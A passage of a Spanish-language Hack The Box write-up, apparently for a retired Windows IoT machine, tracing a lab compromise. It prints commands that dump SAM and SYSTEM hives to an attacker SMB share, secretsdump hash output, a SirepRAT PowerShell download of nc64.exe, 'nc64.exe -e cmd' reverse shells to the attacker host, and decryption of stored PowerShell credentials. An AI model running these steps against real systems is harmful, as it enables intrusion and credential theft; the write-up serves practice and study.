&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Directory of C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp

07/04/2020  09:53 PM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
07/04/2020  09:53 PM    &amp;lt;DIR&amp;gt;          ..
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          3D Objects
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Documents
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Downloads
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Favorites
07/04/2020  08:20 PM               344 hardening.txt
07/04/2020  08:14 PM             1,858 iot-admin.xml
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Music
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Pictures
07/04/2020  09:53 PM             1,958 user.txt
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Videos
               3 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          4,160 bytes
               9 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   4,692,770,816 bytes free
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Intentamos leer la flag&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;user.txt
&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;user.txt
&amp;lt;Objs &lt;span class=&quot;nv&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.1.0.1&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
  &amp;lt;Obj &lt;span class=&quot;nv&quot;&gt;RefId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
    &amp;lt;TN &lt;span class=&quot;nv&quot;&gt;RefId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
      &amp;lt;T&amp;gt;System.Management.Automation.PSCredential&amp;lt;/T&amp;gt;
      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
    &amp;lt;/TN&amp;gt;
    &amp;lt;ToString&amp;gt;System.Management.Automation.PSCredential&amp;lt;/ToString&amp;gt;
    &amp;lt;Props&amp;gt;
      &amp;lt;S &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UserName&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;flag&amp;lt;/S&amp;gt;
      &amp;lt;SS &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Password&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7&amp;lt;/SS&amp;gt;
    &amp;lt;/Props&amp;gt;
  &amp;lt;/Obj&amp;gt;
&amp;lt;/Objs&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Vemos que nos arroja &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System.Management.Automation.PSCredential&lt;/code&gt;
 Esto nos indica que la credencial o el archivo esta protegido por cifrado. Como vemos en nuestra tty no podemos listar nuestro privilegios.
 Para ver si tenemos privilegios intentamos crearnos una carpeta que se llame Temp en la /raiz
 Como vemos que si nos deja vamos a intentar extraer dos archivos para intentar sacar los hashes NTLM de la maquina LOCAL&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- Comanndo 1:
&lt;span class=&quot;s2&quot;&gt;&quot;reg save HKLM&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem system.backup&quot;&lt;/span&gt;
reg save HKLM&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem system.backup
The operation completed successfully.

- Comando 2:
&lt;span class=&quot;s2&quot;&gt;&quot;reg save HKLM&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;am sam.backup&quot;&lt;/span&gt;
reg save HKLM&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;am sam.backup
The operation completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a ver si hemos obtenido correctamente los dos archivos&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nb&quot;&gt;dir
dir
 &lt;/span&gt;Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp

09/04/2021  12:11 PM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
09/04/2021  12:11 PM    &amp;lt;DIR&amp;gt;          ..
09/04/2021  12:11 PM            36,864 sam.backup
09/04/2021  12:11 PM        15,044,608 system.backup
               2 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     15,081,472 bytes
               2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     569,507,840 bytes free
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Una vez lo tenemos listos en la carpeta Temp, procedemos a crearnos un Recurso Compàrtido para desde la maquina victima crear una unidad Logica ‘X’ y pasarnos los archivos sam y system.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# impacket-smbserver smbFolder $(pwd) -smb2support -username k1pro -password kipro123&lt;/span&gt;
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Incoming connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.204,49671&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AUTHENTICATE_MESSAGE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;1pro,omni&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User omni&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;1pro authenticated successfully
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; k1pro:::aaaaaaaaaaaaaaaa:1bf4952080b8f957e528c6bd9afd2749:01010000000000008074c46d86a1d70158fdbda39821fcc30000000001001000560045006f0065007400510067006b0003001000560045006f0065007400510067006b00020010004b00790043006e005000460069004700040010004b00790043006e005000460069004700070008008074c46d86a1d701060004000200000008003000300000000000000000000000004000001f7d024059ddf8ec166fe62db294b53f23d6aa04a28753a1a1b0458cb31644420a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003400000000000000000000000000
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Connecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1:IPC&lt;span class=&quot;nv&quot;&gt;$)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Connecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2:smbFolder&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Disconnecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1:IPC&lt;span class=&quot;nv&quot;&gt;$)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a Crear la Unidad Logica X: que este sincronizada a nuestro recurso compartido a nivel de Red y copiamos los dos archivos.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net use x: &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.16.4&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;mbFolder /user:k1pro kipro123
net use x: &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.16.4&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;mbFolder /user:k1pro kipro123
The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.


copy system.backup x:&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
copy system.backup x:&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
        1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; copied.

copy system.backup x:&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;am
copy system.backup x:&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;am
        1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; copied.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Una vez los tenemos.. vamos a hacer uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# secretsdump.py -system system.backup -sam sam.backup LOCAL &lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Dumping &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;SAM hashes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;uid:rid:lmhash:nthash&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::
DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::
app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe29XXXXXXXX:::
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Cleaning up... 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Probamos a tirar de RainbowTables en la pagina web de CrackStation y sacamos la siguiente Credencial:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;USER: app , PASS: mesh5XXX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;escalando-privilegios-al-user-app&quot;&gt;Escalando Privilegios al User App&lt;/h1&gt;

&lt;p&gt;Procedemos a apuntar a la pagina web por el puerto 8080
Nos conectamos al CMS http://10.10.10.204:8080/&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Miramos los apartados del CMS vemos/seleccionamos: 
processes &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
run comand &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; %USERNAME% &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; App
C:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c64-exe &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd 10.10.16.4 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;No tenemos acceso desde nuestro nc64.exe almacenado en Windows\Temp → lo movemos a esta ruta \Temp
Nos compartimos en un servidor con python3 el archivo nc64.exe para alojarlo.&lt;/p&gt;
&lt;h1 id=&quot;python3-sirepratpy-101010204-launchcommandwithoutput-return_output-cmd-powershell-args---c-iwr--uri-http1010164nc64exe--outfile-ctempnc64exe&quot;&gt;python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput –return_output –cmd “powershell” –args “ -c iwr -uri http://10.10.16.4/nc64.exe -OutFile C:\Temp\nc64.exe”&lt;/h1&gt;
&lt;p&gt;&amp;lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&amp;gt;
``
Conseguimos acceso como el usuario App&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
 &lt;/span&gt;Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp

07/04/2020  09:53 PM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
07/04/2020  09:53 PM    &amp;lt;DIR&amp;gt;          ..
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          3D Objects
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Documents
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Downloads
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Favorites
07/04/2020  08:20 PM               344 hardening.txt
07/04/2020  08:14 PM             1,858 &lt;span class=&quot;s2&quot;&gt;&quot; iot-admin.xml &quot;&lt;/span&gt;
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Music
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Pictures
07/04/2020  09:53 PM             1,958 &lt;span class=&quot;s2&quot;&gt;&quot; user.txt &quot;&lt;/span&gt;
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Videos
               3 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          4,160 bytes
               9 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   4,692,705,280 bytes free
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&quot;powershell-sssecure-strings&quot;&gt;PowerShell SS(Secure Strings)&lt;/h1&gt;
&lt;p&gt;Procedemos a lanzarnos una PowerShell para visualizar la flag que esta securizada&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell
powershell
Windows PowerShell 
Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Microsoft Corporation. All rights reserved.

Attempting to perform the InitializeDefaultDrives operation on the &lt;span class=&quot;s1&quot;&gt;&apos;FileSystem&apos;&lt;/span&gt; provider failed.

&lt;span class=&quot;s2&quot;&gt;&quot; (Import-CliXml -Path user.txt).GetNetworkCredential().password &quot;&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Importante de Recordar
&lt;span class=&quot;s2&quot;&gt;&quot; (Import-CliXml -Path user.txt).GetNetworkCredential().password &quot;&lt;/span&gt;
7cfd50f6bc34db3204898fxxxxxxxxxxxxxxx

PS C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Sacando la informacion del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iot-admin.xml&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Import-CliXml &lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt; IoT-admin.xml&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.GetNetworkCredential&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.password
_1nt3rn37ofTh1nxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Sacamos las credenciales del usuario Administrator:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;administrator: _1nt3rn37ofTh1nGz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a hacer el mismo procedimiento para el usuarios Administrator.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nos volvemos a conectar al CMS como Administrator

Ejecutamos el comando : en el CMS
C:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c64.exe &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd 10.10.16.4 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Recibimos la conexion como el user Administrator&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# rlwrap nc -vlnp 443&lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.16.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.204] 49685
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.17763.107]
Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Microsoft Corporation. All rights reserved.

&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; %USERNAME%
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; %USERNAME%
Administrator
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a enumerar para encontrar la flag de root.txt&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator

Mode                LastWriteTime         Length Name                          
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                          
d-r---         7/3/2020  11:23 PM                3D Objects                    
d-r---         7/3/2020  11:23 PM                Documents                     
d-r---         7/3/2020  11:23 PM                Downloads                     
d-----         7/3/2020  11:23 PM                Favorites                     
d-r---         7/3/2020  11:23 PM                Music                         
d-r---         7/3/2020  11:23 PM                Pictures                      
d-r---         7/3/2020  11:23 PM                Videos                        
&lt;span class=&quot;nt&quot;&gt;-ar---&lt;/span&gt;         7/4/2020   9:48 PM           1958&lt;span class=&quot;s2&quot;&gt;&quot; root.txt &quot;&lt;/span&gt;                      
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Lanzamos otra vez na PowerShell para sacar la flag del root.txt&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot; (Import-CliXml -Path root.txt).GetNetworkCredential().password &quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot; (Import-CliXml -Path root.txt).GetNetworkCredential().password &quot;&lt;/span&gt;
 5dbdce5569e2c47xxxxxxxxxxxx6e9bf11d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Maquina Rootead =) K0Hack&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="HTB," /><category term="OSCP" /><category term="Path," /><category term="Windows" /><category term="Device" /><category term="Portal," /><category term="SecretsDump.py," /><category term="System," /><category term="Sam," /><category term="PowerShell" /><category term="SS," /><category term="Windows," /><category term="Maquinas" /><category term="Retiradas," /><category term="Writeup," /><category term="Hacking" /><summary type="html">Lame ~ Hack The Box to OSCP</summary></entry></feed>